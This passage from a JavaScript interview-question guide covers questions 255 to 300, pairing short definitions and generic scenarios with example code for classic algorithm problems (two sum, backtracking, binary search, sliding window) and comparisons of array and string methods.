const evens2 = numbers.filter(n => n % 2 === 0);
// [2, 4] (length 2)
```

---

### Question 255: How do you implement a two sum problem?

#### Definition
Two sum finds two numbers in an array that add up to a target. Like finding two prices that sum to a budget. Can use brute force (O(n²)) or hash map (O(n)). Classic hash map problem.

#### Real-World Scenario / Case Study
A shopping system needed to find item pairs matching a budget. The two sum algorithm found matches efficiently. The system could suggest product combinations.

#### Example Code
```js
function twoSum(nums, target) {
  const map = new Map();
  
  for (let i = 0; i < nums.length; i++) {
    const complement = target - nums[i];
    if (map.has(complement)) {
      return [map.get(complement), i];
    }
    map.set(nums[i], i);
  }
  
  return [];
}
```

---

### Question 256: What is the difference between `String.prototype.indexOf()` and `String.prototype.search()`?

#### Definition
Both find positions, but `indexOf` searches for a string (exact match), while `search` uses a regex pattern. `indexOf` is simpler for exact strings, `search` is for pattern matching. Both return -1 if not found.

#### Real-World Scenario / Case Study
Code needed pattern matching but was using `indexOf` with manual character checking. Using `search` with regex simplified the code significantly.

#### Example Code
```js
const str = 'Hello 123 World';
str.indexOf('123');        // 6 (exact string)
str.search(/\d+/);         // 6 (regex pattern)
str.indexOf(/d+/);         // -1 (indexOf doesn't accept regex!)
```

---

### Question 257: How do you implement a three sum problem?

#### Definition
Three sum finds three numbers that add up to zero (or target). Like finding three items with zero total. Uses sorting and two pointers. Reduces to two sum problem. Classic two-pointer problem.

#### Real-World Scenario / Case Study
A system needed to find triplets matching criteria. The three sum algorithm found combinations efficiently. The system could analyze relationships between three entities.

#### Example Code
```js
function threeSum(nums) {
  nums.sort((a, b) => a - b);
  const result = [];
  
  for (let i = 0; i < nums.length - 2; i++) {
    if (i > 0 && nums[i] === nums[i - 1]) continue;
    
    let left = i + 1;
    let right = nums.length - 1;
    
    while (left < right) {
      const sum = nums[i] + nums[left] + nums[right];
      if (sum === 0) {
        result.push([nums[i], nums[left], nums[right]]);
        while (left < right && nums[left] === nums[left + 1]) left++;
        while (left < right && nums[right] === nums[right - 1]) right--;
        left++;
        right--;
      } else if (sum < 0) {
        left++;
      } else {
        right--;
      }
    }
  }
  
  return result;
}
```

---

### Question 258: What is the difference between `Array.prototype.concat()` and spread for nested arrays?

#### Definition
Both combine arrays, but `concat` flattens one level if you pass arrays, while spread doesn't flatten. `concat([1, 2], [3, 4])` gives `[1, 2, 3, 4]`, but `[...[1, 2], ...[3, 4]]` also gives `[1, 2, 3, 4]`. For nested arrays, behavior differs.

#### Real-World Scenario / Case Study
Code needed to combine arrays without flattening. Understanding the difference helped choose the right method. The team used spread for explicit control.

#### Example Code
```js
const arr1 = [1, 2];
const arr2 = [3, 4];

arr1.concat(arr2);        // [1, 2, 3, 4]
[...arr1, ...arr2];        // [1, 2, 3, 4]

// Nested:
arr1.concat([arr2]);      // [1, 2, [3, 4]] (doesn't flatten)
[...arr1, arr2];           // [1, 2, [3, 4]] (same)
```

---

### Question 259: How do you implement a remove duplicates from sorted array problem?

#### Definition
Remove duplicates modifies array in-place to keep only unique elements, returning new length. Like removing duplicate entries from a sorted list. Uses two pointers - one for reading, one for writing unique elements.

#### Real-World Scenario / Case Study
A system needed to deduplicate sorted data efficiently. The algorithm removed duplicates in-place. The system could clean data without creating new arrays.

#### Example Code
```js
function removeDuplicates(nums) {
  if (nums.length === 0) return 0;
  
  let writeIndex = 1;
  for (let readIndex = 1; readIndex < nums.length; readIndex++) {
    if (nums[readIndex] !== nums[readIndex - 1]) {
      nums[writeIndex] = nums[readIndex];
      writeIndex++;
    }
  }
  
  return writeIndex;
}
```

---

### Question 260: What is the difference between `Array.prototype.find()` and `Array.prototype.findLast()`?

#### Definition
Both find elements, but `find` searches from start (first match), `findLast` searches from end (last match). Like searching a book from front vs back. `findLast` is newer and useful when you need the last matching element.

#### Real-World Scenario / Case Study
Code needed the last matching element but was using `find` and manually searching backwards. Using `findLast` simplified the code and made intent clear.

#### Example Code
```js
const arr = [1, 2, 3, 2, 4];

arr.find(x => x === 2);      // 2 (first)
arr.findLast(x => x === 2);   // 2 (last, at index 3)
```

---

### Question 261: How do you implement a best time to buy and sell stock problem?

#### Definition
Best time to buy/sell finds maximum profit from buying low and selling high. Like stock trading - buy at lowest, sell at highest. Uses one pass tracking minimum price and maximum profit. Classic array problem.

#### Real-World Scenario / Case Study
A trading system needed to find optimal buy/sell points. The algorithm found maximum profit efficiently. The system could suggest optimal trading strategies.

#### Example Code
```js
function maxProfit(prices) {
  let minPrice = Infinity;
  let maxProfit = 0;
  
  for (const price of prices) {
    minPrice = Math.min(minPrice, price);
    maxProfit = Math.max(maxProfit, price - minPrice);
  }
  
  return maxProfit;
}
```

---

### Question 262: What is the difference between `Object.keys()`, `Object.values()`, and `Object.entries()` performance?

#### Definition
All iterate object properties, but `keys` gets property names, `values` gets values, `entries` gets both. Performance is similar (all O(n)), but `entries` does more work. Use the one that gives you what you need - don't use `entries` if you only need keys.

#### Real-World Scenario / Case Study
Code was using `entries` everywhere and extracting keys/values manually. Using the appropriate method (`keys` or `values`) made the code more efficient and clearer.

#### Example Code
```js
const obj = { a: 1, b: 2, c: 3 };

Object.keys(obj);     // ['a', 'b', 'c'] - just names
Object.values(obj);   // [1, 2, 3] - just values
Object.entries(obj);  // [['a',1], ['b',2], ['c',3]] - both

// Use appropriate one:
Object.keys(obj).forEach(key => console.log(key, obj[key]));  // Efficient
Object.entries(obj).forEach(([key, val]) => console.log(key, val));  // More work
```

---

### Question 263: How do you implement a valid palindrome problem?

#### Definition
Valid palindrome checks if a string reads the same forwards and backwards (ignoring case, non-alphanumeric). Like checking if "A man a plan a canal Panama" is a palindrome. Uses two pointers from both ends.

#### Real-World Scenario / Case Study
A text validation system needed to check palindromes. The algorithm verified palindromes efficiently. The system could validate user input and detect palindromic patterns.

#### Example Code
```js
function isPalindrome(s) {
  const cleaned = s.toLowerCase().replace(/[^a-z0-9]/g, '');
  let left = 0;
  let right = cleaned.length - 1;
  
  while (left < right) {
    if (cleaned[left] !== cleaned[right]) return false;
    left++;
    right--;
  }
  
  return true;
}
```

---

### Question 264: What is the difference between `Array.prototype.fill()` with objects and primitives?

#### Definition
`fill` with primitives creates independent copies, but with objects, all elements reference the same object. Like filling an array with the same book vs copies of the book. Use `fill` with primitives, use `map` or `Array.from` for objects.

#### Real-World Scenario / Case Study
Code was using `fill` with objects, causing all elements to reference the same object. Modifying one affected all. Using `Array.from` with a factory function created separate objects.

#### Example Code
```js
// Primitives - independent:
const arr1 = new Array(3).fill(0);
arr1[0] = 1;
console.log(arr1);  // [1, 0, 0] (independent)

// Objects - shared reference:
const arr2 = new Array(3).fill({ value: 0 });
arr2[0].value = 1;
console.log(arr2);  // [{value:1}, {value:1}, {value:1}] (all changed!)

// Fix:
const arr3 = Array.from({ length: 3 }, () => ({ value: 0 }));
arr3[0].value = 1;
console.log(arr3);  // [{value:1}, {value:0}, {value:0}] (independent)
```

---

### Question 265: How do you implement a longest substring without repeating characters?

#### Definition
Finds the longest substring with all unique characters. Like finding the longest word with no repeated letters. Uses sliding window with a Set or Map to track characters. Classic sliding window problem.

#### Real-World Scenario / Case Study
A text analysis system needed to find unique character sequences. The algorithm found longest unique substrings efficiently. The system could analyze text patterns and identify unique segments.

#### Example Code
```js
function lengthOfLongestSubstring(s) {
  const seen = new Set();
  let maxLength = 0;
  let left = 0;
  
  for (let right = 0; right < s.length; right++) {
    while (seen.has(s[right])) {
      seen.delete(s[left]);
      left++;
    }
    seen.add(s[right]);
    maxLength = Math.max(maxLength, right - left + 1);
  }
  
  return maxLength;
}
```

---

### Question 266: What is the difference between `Number.parseFloat()` and `Number()` constructor?

#### Definition
Both convert to numbers, but `parseFloat` parses from the beginning until it hits a non-numeric character, while `Number()` converts the entire string or returns NaN. `parseFloat('123abc')` returns 123, `Number('123abc')` returns NaN. Use `parseFloat` for partial parsing, `Number` for strict conversion.

#### Real-World Scenario / Case Study
Code was parsing user input with `Number()`, which rejected valid partial numbers. Using `parseFloat` allowed parsing numbers with units or suffixes, making input more flexible.

#### Example Code
```js
Number('123');        // 123
Number('123.45');     // 123.45
Number('123abc');     // NaN (strict)
Number(' 123 ');      // 123 (trims)

parseFloat('123');    // 123
parseFloat('123.45'); // 123.45
parseFloat('123abc'); // 123 (parses until non-numeric)
parseFloat(' 123 ');  // 123 (trims)
```

---

### Question 267: How do you implement a letter combinations of phone number problem?

#### Definition
Generates all possible letter combinations from a phone number (like old T9 texting). Like "23" can be "ad", "ae", "af", "bd", "be", "bf", "cd", "ce", "cf". Uses backtracking to generate all combinations.

#### Real-World Scenario / Case Study
A system needed to generate word suggestions from number input. The algorithm provided all possible combinations. The system could suggest words and validate inputs.

#### Example Code
```js
function letterCombinations(digits) {
  if (!digits) return [];
  
  const map = {
    '2': 'abc', '3': 'def', '4': 'ghi',
    '5': 'jkl', '6': 'mno', '7': 'pqrs',
    '8': 'tuv', '9': 'wxyz'
  };
  
  const result = [];
  
  function backtrack(index, current) {
    if (index === digits.length) {
      result.push(current);
      return;
    }
    
    const letters = map[digits[index]];
    for (const letter of letters) {
      backtrack(index + 1, current + letter);
    }
  }
  
  backtrack(0, '');
  return result;
}
```

---

### Question 268: What is the difference between `Array.prototype.reduce()` accumulator mutation?

#### Definition
`reduce`'s accumulator can be mutated or returned as new value. Mutating (like `acc.push()`) modifies the same object, returning new (like `[...acc, item]`) creates new objects. Mutating is faster but can cause bugs. Returning new is safer and more functional.

#### Real-World Scenario / Case Study
Code was mutating the accumulator in `reduce`, causing unexpected side effects. Returning new values made the code predictable and easier to debug.

#### Example Code
```js
const arr = [1, 2, 3];

// Mutating accumulator:
arr.reduce((acc, val) => {
  acc.push(val * 2);  // Mutates same array
  return acc;
}, []);  // [2, 4, 6]

// Returning new:
arr.reduce((acc, val) => {
  return [...acc, val * 2];  // New array each time
}, []);  // [2, 4, 6]
```

---

### Question 269: How do you implement a word search problem (backtracking)?

#### Definition
Word search finds if a word exists in a 2D grid, moving to adjacent cells (horizontally/vertically). Like a word search puzzle. Uses backtracking with DFS to explore paths. Classic backtracking on a grid.

#### Real-World Scenario / Case Study
A game needed word validation on a grid. The algorithm found words efficiently. The system could validate player moves and check word existence.

#### Example Code
```js
function exist(board, word) {
  const m = board.length;
  const n = board[0].length;
  
  function dfs(i, j, index) {
    if (index === word.length) return true;
    if (i < 0 || i >= m || j < 0 || j >= n || board[i][j] !== word[index]) {
      return false;
    }
    
    const temp = board[i][j];
    board[i][j] = '#';
    
    const found = dfs(i+1,j,index+1) || dfs(i-1,j,index+1) ||
                  dfs(i,j+1,index+1) || dfs(i,j-1,index+1);
    
    board[i][j] = temp;
    return found;
  }
  
  for (let i = 0; i < m; i++) {
    for (let j = 0; j < n; j++) {
      if (dfs(i, j, 0)) return true;
    }
  }
  return false;
}
```

---

### Question 270: What is the difference between `Array.prototype.flatMap()` and `Array.prototype.map().flat()`?

#### Definition
Both transform and flatten, but `flatMap` does it in one optimized step (no intermediate array), while `map().flat()` creates an intermediate array. `flatMap` is more efficient. Both flatten one level only.

#### Real-World Scenario / Case Study
Code was using `map().flat()` creating unnecessary intermediate arrays. Switching to `flatMap` improved memory usage and performance.

#### Example Code
```js
const arr = [1, 2, 3];
arr.map(x => [x, x*2]).flat();  // Creates [[1,2],[2,4],[3,6]] then flattens
arr.flatMap(x => [x, x*2]);     // Direct, no intermediate array
```

---

### Question 271: How do you implement a spiral matrix problem?

#### Definition
Spiral matrix traverses a 2D array in spiral order (right, down, left, up, repeat). Like going around the edges of a rectangle. Uses boundaries to track which direction to go. Classic array traversal problem.

#### Real-World Scenario / Case Study
A system needed to process grid data in spiral order. The algorithm provided correct traversal. The system could process images or matrices in spiral patterns.

#### Example Code
```js
function spiralOrder(matrix) {
  const result = [];
  let top = 0, bottom = matrix.length - 1;
  let left = 0, right = matrix[0].length - 1;
  
  while (top <= bottom && left <= right) {
    for (let j = left; j <= right; j++) result.push(matrix[top][j]);
    top++;
    for (let i = top; i <= bottom; i++) result.push(matrix[i][right]);
    right--;
    if (top <= bottom) {
      for (let j = right; j >= left; j--) result.push(matrix[bottom][j]);
      bottom--;
    }
    if (left <= right) {
      for (let i = bottom; i >= top; i--) result.push(matrix[i][left]);
      left++;
    }
  }
  return result;
}
```

---

### Question 272: What is the difference between `String.prototype.replace()` and `String.prototype.replaceAll()`?

#### Definition
Both replace text, but `replace` replaces first match (or all with global flag), while `replaceAll` replaces all matches without needing global flag. `replaceAll` is simpler when you want all replacements. Both work with strings or regex.

#### Real-World Scenario / Case Study
Code was using `replace` with global flag everywhere. Using `replaceAll` made the code clearer about intent. The team standardized on `replaceAll` for multiple replacements.

#### Example Code
```js
const str = 'hello hello world';
str.replace('hello', 'hi');      // 'hi hello world' (first only)
str.replace(/hello/g, 'hi');     // 'hi hi world' (needs global flag)
str.replaceAll('hello', 'hi');   // 'hi hi world' (all, no flag needed)
```

---

### Question 273: How do you implement a search in rotated sorted array problem?

#### Definition
Searches for a target in a rotated sorted array (like [4,5,6,7,0,1,2] - sorted then rotated). Uses binary search with logic to determine which half to search. More complex than regular binary search due to rotation.

#### Real-World Scenario / Case Study
A system needed to search rotated data efficiently. The algorithm found targets in O(log n) time. The system could handle rotated datasets without re-sorting.

#### Example Code
```js
function search(nums, target) {
  let left = 0, right = nums.length - 1;
  
  while (left <= right) {
    const mid = Math.floor((left + right) / 2);
    if (nums[mid] === target) return mid;
    
    if (nums[left] <= nums[mid]) {
      if (target >= nums[left] && target < nums[mid]) {
        right = mid - 1;
      } else {
        left = mid + 1;
      }
    } else {
      if (target > nums[mid] && target <= nums[right]) {
        left = mid + 1;
      } else {
        right = mid - 1;
      }
    }
  }
  
  return -1;
}
```

---

### Question 274: What is the difference between `Array.prototype.reduce()` and manual loop accumulation?

#### Definition
Both accumulate values, but `reduce` is functional and declarative (says what you want), while loops are imperative (says how to do it). `reduce` is more concise and functional, loops give more control. Use `reduce` for simple accumulation, loops for complex logic.

#### Real-World Scenario / Case Study
Code had verbose accumulation loops. Using `reduce` made the code more concise and readable. The team standardized on `reduce` for simple accumulations.

#### Example Code
```js
const arr = [1, 2, 3, 4];

// Manual loop:
let sum = 0;
for (const num of arr) {
  sum += num;
}

// reduce:
const sum2 = arr.reduce((acc, num) => acc + num, 0);
```

---

### Question 275: How do you implement a combination problem (backtracking)?

#### Definition
Combinations find all ways to choose k elements from n elements. Like choosing a team from a group. Uses backtracking to explore all choices. Order doesn't matter - [1,2] and [2,1] are the same combination.

#### Real-World Scenario / Case Study
A system needed to generate all possible selections. The combination algorithm provided all valid choices. The system could suggest options and validate selections.

#### Example Code
```js
function combine(n, k) {
  const result = [];
  
  function backtrack(start, current) {
    if (current.length === k) {
      result.push([...current]);
      return;
    }
    
    for (let i = start; i <= n; i++) {
      current.push(i);
      backtrack(i + 1, current);
      current.pop();
    }
  }
  
  backtrack(1, []);
  return result;
}
```

---

### Question 276: What is the difference between `Array.prototype.splice()` return value and side effects?

#### Definition
`splice` returns an array of removed elements, but also mutates the original array. It does two things: returns removed items and modifies the array. Be careful - the return value is what was removed, not the modified array.

#### Real-World Scenario / Case Study
Code was confusing `splice`'s return value with the modified array. Understanding that it returns removed elements helped fix bugs. The team learned to check both the return and the original array.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];
const removed = arr.splice(1, 2);
console.log(removed);  // [2, 3] (what was removed)
console.log(arr);     // [1, 4, 5] (modified array)
```

---

### Question 277: How do you implement a subsets problem (backtracking)?

#### Definition
Subsets finds all possible subsets of an array. Like finding all combinations of items (including empty set). Uses backtracking - for each element, include it or don't. Classic backtracking problem.

#### Real-World Scenario / Case Study
A system needed to generate all possible feature combinations. The subsets algorithm provided all valid combinations. The system could suggest configurations and validate selections.

#### Example Code
```js
function subsets(nums) {
  const result = [];
  
  function backtrack(index, current) {
    result.push([...current]);
    
    for (let i = index; i < nums.length; i++) {
      current.push(nums[i]);
      backtrack(i + 1, current);
      current.pop();
    }
  }
  
  backtrack(0, []);
  return result;
}
```

---

### Question 278: What is the difference between `Array.prototype.indexOf()` and `Array.prototype.lastIndexOf()` with same value?

#### Definition
Both find indices, but `indexOf` finds first occurrence (left to right), `lastIndexOf` finds last occurrence (right to left). For arrays with duplicates, they return different indices. Use `indexOf` for first match, `lastIndexOf` for last match.

#### Real-World Scenario / Case Study
Code needed the last occurrence but was using `indexOf` and searching manually. Using `lastIndexOf` simplified the code and made intent clear.

#### Example Code
```js
const arr = [1, 2, 3, 2, 4];
arr.indexOf(2);      // 1 (first)
arr.lastIndexOf(2);   // 3 (last)
```

---

### Question 279: How do you implement a remove element problem (in-place)?

#### Definition
Remove element removes all instances of a value from array in-place, returning new length. Like filtering out specific values without creating new array. Uses two pointers - one for reading, one for writing (skipping target values).

#### Real-World Scenario / Case Study
A system needed to remove values efficiently without extra memory. The in-place algorithm provided O(1) space solution. The system could clean data without memory overhead.

#### Example Code
```js
function removeElement(nums, val) {
  let writeIndex = 0;
  
  for (let readIndex = 0; readIndex < nums.length; readIndex++) {
    if (nums[readIndex] !== val) {
      nums[writeIndex] = nums[readIndex];
      writeIndex++;
    }
  }
  
  return writeIndex;
}
```

---

### Question 280: What is the difference between `Array.prototype.find()` and `Array.prototype.filter()[0]` performance?

#### Definition
Both can get one element, but `find` stops at first match (short-circuits), while `filter()[0]` processes all elements then takes first. `find` is O(k) where k is position of match, `filter` is always O(n). Use `find` for single element lookup.

#### Real-World Scenario / Case Study
Code was using `filter()[0]` to find elements, processing entire arrays unnecessarily. Using `find` improved performance significantly, especially when matches were near the beginning.

#### Example Code
```js
const largeArray = new Array(100000).fill(0).map((_, i) => ({ id: i }));

largeArray.find(x => x.id === 50000);      // Checks ~50000 elements
largeArray.filter(x => x.id === 50000)[0]; // Checks all 100000!
```

---

### Question 281: How do you implement a valid Sudoku problem?

#### Definition
Valid Sudoku checks if a 9x9 grid follows Sudoku rules (no duplicates in rows, columns, or 3x3 boxes). Uses sets or arrays to track seen numbers. Classic constraint validation problem.

#### Real-World Scenario / Case Study
A Sudoku game needed to validate boards. The algorithm checked all constraints efficiently. The system could validate player moves and detect invalid boards.

#### Example Code
```js
function isValidSudoku(board) {
  const rows = Array(9).fill(null).map(() => new Set());
  const cols = Array(9).fill(null).map(() => new Set());
  const boxes = Array(9).fill(null).map(() => new Set());
  
  for (let i = 0; i < 9; i++) {
    for (let j = 0; j < 9; j++) {
      const num = board[i][j];
      if (num === '.') continue;
      
      const boxIndex = Math.floor(i/3) * 3 + Math.floor(j/3);
      
      if (rows[i].has(num) || cols[j].has(num) || boxes[boxIndex].has(num)) {
        return false;
      }
      
      rows[i].add(num);
      cols[j].add(num);
      boxes[boxIndex].add(num);
    }
  }
  
  return true;
}
```

---

### Question 282: What is the difference between `Array.prototype.some()` and checking `array.length > 0` with `filter()`?

#### Definition
`some` checks if any element passes a test and short-circuits. `filter().length > 0` creates a new array and checks its length. `some` is more efficient - it stops at first match and doesn't create arrays. Use `some` for existence checks.

#### Real-World Scenario / Case Study
Code was using `filter().length > 0` to check existence, creating unnecessary arrays. Using `some` improved performance and memory usage.

#### Example Code
```js
const users = [{ active: true }, { active: false }];

users.some(u => u.active);           // true (stops at first)
users.filter(u => u.active).length > 0;  // true (creates array first)
```

---

### Question 283: How do you implement a first missing positive problem?

#### Definition
Finds the smallest positive integer missing from an array. Like finding the first gap in positive numbers. Uses array indices as hash map (marking presence by making values negative). Tricky problem requiring careful index manipulation.

#### Real-World Scenario / Case Study
A system needed to find missing IDs efficiently. The algorithm found gaps in O(n) time with O(1) extra space. The system could identify missing sequence numbers.

#### Example Code
```js
function firstMissingPositive(nums) {
  const n = nums.length;
  
  // Mark non-positives as n+1:
  for (let i = 0; i < n; i++) {
    if (nums[i] <= 0) nums[i] = n + 1;
  }
  
  // Mark presence by making negative:
  for (let i = 0; i < n; i++) {
    const num = Math.abs(nums[i]);
    if (num <= n) {
      nums[num - 1] = -Math.abs(nums[num - 1]);
    }
  }
  
  // Find first positive:
  for (let i = 0; i < n; i++) {
    if (nums[i] > 0) return i + 1;
  }
  
  return n + 1;
}
```

---

### Question 284: What is the difference between `Array.prototype.reduce()` and `Array.prototype.reduceRight()` for building strings?

#### Definition
Both accumulate, but `reduce` builds left-to-right, `reduceRight` builds right-to-left. For string concatenation, order matters. `reduce` gives natural order, `reduceRight` gives reversed order.

#### Real-World Scenario / Case Study
Code needed to build strings in specific order. Understanding the difference helped choose the right method. The team used `reduce` for normal order, `reduceRight` for reverse order.

#### Example Code
```js
const words = ['Hello', 'World', '!'];
words.reduce((a, b) => a + ' ' + b);      // 'Hello World !'
words.reduceRight((a, b) => a + ' ' + b); // '! World Hello'
```

---

### Question 285: How do you implement a merge sorted arrays problem?

#### Definition
Merges two sorted arrays into one sorted array. Like combining two sorted lists. Uses two pointers, comparing elements and adding smaller one. Classic merge step from merge sort.

#### Real-World Scenario / Case Study
A system needed to merge sorted data streams. The algorithm merged efficiently. The system could combine data from multiple sources while maintaining sort order.

#### Example Code
```js
function merge(nums1, m, nums2, n) {
  let i = m - 1, j = n - 1, k = m + n - 1;
  
  while (j >= 0) {
    if (i >= 0 && nums1[i] > nums2[j]) {
      nums1[k--] = nums1[i--];
    } else {
      nums1[k--] = nums2[j--];
    }
  }
}
```

---

### Question 286: What is the difference between `String.prototype.split()` with limit and without?

#### Definition
`split` can take a limit parameter that limits the number of splits. Without limit, splits all occurrences. With limit, stops after N splits. Useful when you only want first N parts.

#### Real-World Scenario / Case Study
Code needed to split strings but only get first few parts. Using the limit parameter prevented unnecessary splits and improved performance.

#### Example Code
```js
const str = 'a,b,c,d,e';
str.split(',');        // ['a','b','c','d','e'] (all)
str.split(',', 3);     // ['a','b','c,d,e'] (only 3 parts)
```

---

### Question 287: How do you implement a pow(x, n) problem (fast exponentiation)?

#### Definition
Calculates x raised to power n efficiently. Uses divide and conquer - x^n = (x^(n/2))^2. Reduces O(n) multiplications to O(log n). Classic optimization problem.

#### Real-World Scenario / Case Study
A system needed exponentiation for cryptographic operations. Fast exponentiation provided efficient calculation. The system could handle large exponents without performance issues.

#### Example Code
```js
function myPow(x, n) {
  if (n === 0) return 1;
  if (n < 0) {
    x = 1 / x;
    n = -n;
  }
  
  if (n % 2 === 0) {
    return myPow(x * x, n / 2);
  } else {
    return x * myPow(x * x, Math.floor(n / 2));
  }
}
```

---

### Question 288: What is the difference between `Array.prototype.flat()` depth and manual flattening?

#### Definition
`flat(depth)` flattens to specified depth, manual flattening can be recursive (all levels) or iterative (controlled). `flat` is simpler, manual gives more control. Use `flat` for standard cases, manual for custom logic.

#### Real-World Scenario / Case Study
Code was manually flattening with complex logic. Using `flat()` simplified the code significantly. The team standardized on `flat()` for standard flattening needs.

#### Example Code
```js
const nested = [1, [2, [3, [4]]]];
nested.flat(2);  // [1, 2, 3, [4]]
nested.flat(Infinity);  // [1, 2, 3, 4]
```

---

### Question 289: How do you implement a search insert position problem (binary search)?

#### Definition
Finds the index where a target should be inserted in a sorted array to maintain order. Like finding where a new score fits in a leaderboard. Uses binary search. Returns index where target is or should be inserted.

#### Real-World Scenario / Case Study
A system needed to maintain sorted order when inserting. The algorithm found insertion points efficiently. The system could insert elements in correct positions.

#### Example Code
```js
function searchInsert(nums, target) {
  let left = 0, right = nums.length;
  
  while (left < right) {
    const mid = Math.floor((left + right) / 2);
    if (nums[mid] < target) {
      left = mid + 1;
    } else {
      right = mid;
    }
  }
  
  return left;
}
```

---

### Question 290: What is the difference between `Array.prototype.map()` and `Array.prototype.forEach()` return values?

#### Definition
`map` returns a new array with transformed elements, `forEach` returns undefined. `map` is for transformation, `forEach` is for side effects. Use `map` when you need the result, `forEach` when you just need to do something with each element.

#### Real-World Scenario / Case Study
Code was using `forEach` and manually building arrays. Using `map` made the code more functional and concise. The team standardized on `map` for transformations.

#### Example Code
```js
const arr = [1, 2, 3];

const doubled = arr.map(x => x * 2);  // [2, 4, 6] (returns array)
const result = arr.forEach(x => x * 2);  // undefined (no return)
```

---

### Question 291: How do you implement a plus one problem?

#### Definition
Increments a number represented as an array of digits. Like adding 1 to [1,2,3] to get [1,2,4]. Handles carry-over when digits become 10. Simple but requires careful carry handling.

#### Real-World Scenario / Case Study
A system worked with digit arrays for large numbers. The algorithm incremented efficiently. The system could handle arithmetic on large numbers represented as arrays.

#### Example Code
```js
function plusOne(digits) {
  for (let i = digits.length - 1; i >= 0; i--) {
    if (digits[i] < 9) {
      digits[i]++;
      return digits;
    }
    digits[i] = 0;
  }
  return [1, ...digits];
}
```

---

### Question 292: What is the difference between `Array.prototype.includes()` and `Set.prototype.has()` for multiple checks?

#### Definition
For single checks, difference is small. For multiple checks, `Set.has()` is much faster (O(1) vs O(n)). If checking many values, convert to Set first. Use `Set` for frequent lookups, `includes` for occasional checks.

#### Real-World Scenario / Case Study
Code was checking many values against an array using `includes` in a loop, causing O(n*m) complexity. Converting to Set and using `has()` reduced to O(m) complexity, improving performance dramatically.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];
const set = new Set(arr);
const values = [1, 3, 5];

// Multiple checks with array:
values.every(v => arr.includes(v));  // O(n*m) - slow

// Multiple checks with Set:
values.every(v => set.has(v));       // O(m) - fast
```

---

### Question 293: How do you implement a remove nth node from end of list problem?

#### Definition
Removes the nth node from the end of a linked list. Like removing the second-to-last item. Uses two pointers with n gap - when fast pointer reaches end, slow pointer is at node before target. Classic two-pointer problem.

#### Real-World Scenario / Case Study
A system needed to remove elements from the end of lists. The algorithm provided efficient removal. The system could manage list structures without full traversal.

#### Example Code
```js
function removeNthFromEnd(head, n) {
  const dummy = { next: head };
  let fast = dummy;
  let slow = dummy;
  
  for (let i = 0; i <= n; i++) {
    fast = fast.next;
  }
  
  while (fast) {
    fast = fast.next;
    slow = slow.next;
  }
  
  slow.next = slow.next.next;
  return dummy.next;
}
```

---

### Question 294: What is the difference between `Array.prototype.reduce()` and manual loop for building objects?

#### Definition
Both can build objects, but `reduce` is functional and declarative, while loops are imperative. `reduce` is more concise for simple accumulations. Loops give more control for complex logic. Use `reduce` for simple object building, loops for complex cases.

#### Real-World Scenario / Case Study
Code had verbose loops building objects. Using `reduce` made the code more concise and functional. The team standardized on `reduce` for simple object building.

#### Example Code
```js
const users = [{ name: 'John', age: 30 }, { name: 'Jane', age: 25 }];

// Manual loop:
const ageMap = {};
for (const user of users) {
  ageMap[user.name] = user.age;
}

// reduce:
const ageMap2 = users.reduce((acc, user) => {
  acc[user.name] = user.age;
  return acc;
}, {});
```

---

### Question 295: How do you implement a valid parentheses problem (stack)?

#### Definition
Valid parentheses checks if brackets are properly matched and nested. Like checking if ( ) [ ] { } are balanced. Uses a stack - push opening, pop on closing, check if stack is empty at end. Classic stack problem.

#### Real-World Scenario / Case Study
A code editor needed to validate bracket matching. The algorithm checked balance efficiently. The editor could highlight matching brackets and detect syntax errors.

#### Example Code
```js
function isValid(s) {
  const stack = [];
  const pairs = { '(': ')', '[': ']', '{': '}' };
  
  for (const char of s) {
    if (pairs[char]) {
      stack.push(char);
    } else {
      if (stack.length === 0 || pairs[stack.pop()] !== char) {
        return false;
      }
    }
  }
  
  return stack.length === 0;
}
```

---

### Question 296: What is the difference between `Array.prototype.reduce()` and `Array.prototype.reduceRight()` for function composition?

#### Definition
For function composition, `reduce` composes right-to-left (f(g(x))), `reduceRight` composes left-to-right (g(f(x))). Order matters for function composition. Use `reduce` for standard composition, `reduceRight` for reverse composition.

#### Real-World Scenario / Case Study
Code needed to compose functions in specific order. Understanding the difference helped achieve correct composition order. The team used `reduce` for standard composition.

#### Example Code
```js
const fns = [x => x + 1, x => x * 2, x => x - 3];
fns.reduce((f, g) => x => f(g(x)));      // (x-3)*2+1
fns.reduceRight((f, g) => x => f(g(x))); // (x+1)*2-3
```

---

### Question 297: How do you implement a majority element problem?

#### Definition
Finds the element appearing more than n/2 times. Like finding the most common vote. Can use hash map (count frequencies) or Boyer-Moore algorithm (O(1) space). Classic array problem.

#### Real-World Scenario / Case Study
A voting system needed to find majority votes. The algorithm found winners efficiently. The system could determine election results quickly.

#### Example Code
```js
function majorityElement(nums) {
  let candidate = null;
  let count = 0;
  
  for (const num of nums) {
    if (count === 0) candidate = num;
    count += (num === candidate) ? 1 : -1;
  }
  
  return candidate;
}
```

---

### Question 298: What is the difference between `Array.prototype.some()` and `Array.prototype.find()` for existence checks?

#### Definition
Both can check existence, but `some` returns boolean, `find` returns the element or undefined. `some` is for "does it exist?", `find` is for "get the element". Use `some` for boolean checks, `find` when you need the element.

#### Real-World Scenario / Case Study
Code was using `find() !== undefined` to check existence. Using `some()` made the code clearer about intent and slightly more efficient.

#### Example Code
```js
const users = [{ active: true }, { active: false }];

users.some(u => u.active);           // true (boolean)
users.find(u => u.active) !== undefined;  // true (but returns object)
```

---

### Question 299: How do you implement a climbing stairs with variable steps problem?

#### Definition
Counts ways to climb stairs with variable step sizes (can take 1, 2, or k steps). Like Fibonacci but with variable steps. Uses dynamic programming. More general than basic climbing stairs.

#### Real-World Scenario / Case Study
A game needed to calculate move combinations with variable step sizes. The algorithm provided efficient calculation. The system could compute possible moves for game mechanics.

#### Example Code
```js
function climbStairs(n, steps = [1, 2]) {
  const dp = new Array(n + 1).fill(0);
  dp[0] = 1;
  
  for (let i = 1; i <= n; i++) {
    for (const step of steps) {
      if (i >= step) {
        dp[i] += dp[i - step];
      }
    }
  }
  
  return dp[n];
}
```

---

### Question 300: What is the difference between `Array.prototype.reduce()` accumulator type with and without initial value for different data types?

#### Definition
Without initial value, accumulator type matches first element type. With initial value, accumulator type matches initial value type. This matters for building arrays/objects - you need an initial value to get the right type. Always provide initial value for non-number accumulators.

#### Real-World Scenario / Case Study
Code was building arrays/objects without initial values, causing type errors. Adding initial values (`[]` or `{}`) fixed the type issues. The team learned to always provide initial values for complex accumulators.

#### Example Code
```js
